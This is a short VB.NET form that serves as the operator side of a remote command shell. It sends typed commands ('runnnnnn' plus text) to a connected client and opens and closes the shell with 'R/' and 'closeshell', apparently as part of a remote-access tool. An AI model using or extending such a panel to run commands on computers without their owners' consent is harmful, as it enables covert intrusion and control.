Public Class TEST
    Public C As Client
    Private Sub TEST_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim B As Byte() = SB("R/")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If TextBox1.Text.Length > 0 Then

                Dim B As Byte() = SB("runnnnnn" + Settings.SPL & TextBox1.Text)
                Dim ClientReq As New Outcoming_Requests(C, B)
                Pending.Req_Out.Add(ClientReq)

                If TextBox1.Text = "cls" Then
                    TextBox2.Clear()
                End If
                TextBox1.Clear()

            End If

        End If
    End Sub

    Private Sub TEST_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim B As Byte() = SB("closeshell")
        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub
End Class